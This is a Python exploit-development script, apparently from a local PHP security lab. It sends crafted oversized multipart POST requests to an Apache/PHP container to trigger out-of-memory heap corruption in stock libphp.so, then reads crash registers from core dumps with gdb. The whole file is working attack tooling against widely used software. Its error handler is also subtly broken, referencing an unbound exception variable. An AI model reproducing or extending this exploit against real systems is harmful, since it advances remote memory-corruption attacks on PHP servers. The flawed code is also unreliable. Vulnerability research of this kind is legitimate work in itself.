#!/usr/bin/env python3
"""oom68: SACRIFICE MODEL of the stock crash.

Pattern in oom65 AND oom67 (2 boots): warm-up k1 1900..3200, then
k1=3400 fires ran [200, CRASH, CRASH, CRASH] — survivor FIRST, then all
crash. Model: the first finisher's OOM death ARRANGES the heap; every
later fire crashes. oom66 (no warm-up) = 0/18 → warm-up needed.

Test:
  [1] fresh boot: warm-up 1900..3200, sacrificial k1=3400 (expect 200),
      then 6 k1=3400 fires (expect 6/6 crash).
  [2] restart WITHOUT re-warmup: 3 k1=3400 fires (arming persists?)
  [3] restart + FULL recipe again: 3 fires (re-arms?)
  [4] decode rdi from 2 cores: constant or moving?
"""
import re
import subprocess
import time
import urllib.request

LAB = "http://127.0.0.1:8081"
LIB = "/usr/lib/apache2/modules/libphp.so"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
PHPLAB = "/Users/vlad/Projects/queue/php2shell-lab"
HEXD = b"0123456789abcdef"
KEYLEN = 3064
PREP = 3
POISON_PAGES = 40
CELLS = 10237
K1S = [1900, 1950, 2000, 2044, 2100, 2200, 2400, 2600, 2800, 3000, 3200]


def sh(cmd, timeout=25, retries=2):
    for _ in range(retries + 1):
        try:
            r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                               capture_output=True, timeout=timeout)
            return (r.stdout.decode("latin1") + r.stderr.decode("latin1")[:150]).strip()
        except subprocess.TimeoutExpired:
            time.sleep(1)
    return "<<EXEC TIMEOUT>>"


def key_part(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (KEYLEN - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(n, stamp_offset):
    namelen = POISON_PAGES * 4096 - 25
    total = namelen - 1 - 6
    ncells = total // 16
    pad = total - ncells * 16
    idx = stamp_offset
    body = bytearray()
    for _ in range(ncells):
        stamp = bytes([HEXD[(idx >> (4 * (5 - k))) & 0xF] for k in range(6)])
        body += stamp + b"z" * 10
        idx += 1
    body += b"p" * pad
    nm = b"q" + bytes(body) + (b"%06d" % n)
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build_attack(k1, stamp_base):
    ps = [key_part(i) for i in range(k1)]
    ps += [poison_part(n, stamp_base + n * CELLS) for n in range(PREP)]
    ps += [key_part(i) for i in range(k1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def post(att):
    req = urllib.request.Request(LAB + "/oom_mod.php", data=att,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return "200"
    except urllib.error.HTTPError:
        return "HTTP%s" % e.code
    except Exception as e:
        return type(e).__name__


def segv_count():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return len(re.findall(r"exit signal Segmentation", (r.stdout + r.stderr).decode("latin1", "replace")))


def fire(tag, att, base, sb):
    code = post(att)
    time.sleep(2)
    s = segv_count()
    d = s - base
    cores = sh("ls /tmp/core* 2>/dev/null | wc -l", 10)
    print("  %s: %-9s segv+=%d cores=%s" % (tag, code, d, cores), flush=True)
    return s, d


def boot():
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(20):
        time.sleep(1.5)
        try:
            urllib.request.urlopen(LAB + "/oom_sapi.php", timeout=4).read()
            return
        except Exception:
            pass


def main():
    print("=== [0] stock + lim=8M ===", flush=True)
    md5 = sh("md5sum %s | cut -d' ' -f1" % LIB, 15)
    if md5 != STOCK_MD5:
        print("[ABORT] md5=%s" % md5, flush=True)
        return
    ini = "memory_limit=8M\nmax_input_vars=100000\npost_max_size=4096M\n"
    subprocess.run(["docker", "exec", "-i", "php_vuln", "sh", "-c",
                    "cat > /usr/local/etc/php/conf.d/30-oomlab.ini"],
                   input=ini.encode(), capture_output=True)
    sh("grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars")
    sh("printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf")
    sh("rm -f /tmp/core*")
    boot()
    sh("rm -f /tmp/core*")
    print("[ini]", sh("curl -s -m 5 http://127.0.0.1/oom_sapi.php", 10), flush=True)

    fin = build_attack(3400, 6000000)
    warm = [(k1, build_attack(k1, 5000000 + fi * 100000)) for fi, k1 in enumerate(K1S)]

    print("=== [1] warm-up + sacrifice + 6 fires ===", flush=True)
    base = segv_count()
    for k1, att in warm:
        base, _ = fire("warm k1=%d" % k1, att, base, 0)
    base, d = fire("SACRIFICE", fin, base, 0)
    crashes = 0
    for i in range(6):
        base, d = fire("fire%d" % i, fin, base, 0)
        crashes += d
    print(">>> phase1: %d/6 post-sacrifice crashes" % crashes, flush=True)

    print("=== [2] restart, NO re-warmup, 3 fires ===", flush=True)
    boot()
    sh("rm -f /tmp/core*")
    base = segv_count()
    c2 = 0
    for i in range(3):
        base, d = fire("rst-fire%d" % i, fin, base, 0)
        c2 += d
    print(">>> phase2 (no warmup): %d/3" % c2, flush=True)

    print("=== [3] restart + full recipe, 3 fires ===", flush=True)
    boot()
    sh("rm -f /tmp/core*")
    base = segv_count()
    for k1, att in warm:
        base, _ = fire("warm2 k1=%d" % k1, att, base, 0)
    base, _ = fire("SACRIFICE2", fin, base, 0)
    c3 = 0
    for i in range(3):
        base, d = fire("armed-fire%d" % i, fin, base, 0)
        c3 += d
    print(">>> phase3 (re-armed): %d/3" % c3, flush=True)

    print("=== [4] rdi across cores ===", flush=True)
    sh("rm -f /tmp/core*")
    base = segv_count()
    for i in range(2):
        base, d = fire("rdi-fire%d" % i, fin, base, 0)
    core_list = sh("ls -t /tmp/core* | head -2 | tr '\\n' ' '", 10).split()
    for i, corep in enumerate(core_list[:2]):
        subprocess.run(["docker", "cp", "php_vuln:%s" % corep, "phpbuild:/tmp/c68_%d" % i],
                       capture_output=True)
        r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                            "gdb -q -batch -ex 'info registers rdi rip' /tmp/libphp.stock.so /tmp/c68_%d 2>/dev/null | grep -E 'rdi|rip'" % i],
                           capture_output=True, timeout=120)
        print("  core%d: %s" % (i, " | ".join(l.strip() for l in r.stdout.decode().strip().splitlines())), flush=True)

    print("=== [5] restore ===", flush=True)
    sh("rm -f /usr/local/etc/php/conf.d/30-oomlab.ini /etc/apache2/conf-enabled/oomcore.conf /tmp/core*")
    sh("sed -i '/ulimit -c/d' /etc/apache2/envvars")
    boot()
    print("[restored]", sh("md5sum %s | cut -c1-8" % LIB, 15),
          sh("curl -s -m 5 http://127.0.0.1/oom_sapi.php", 10), flush=True)


if __name__ == "__main__":
    main()
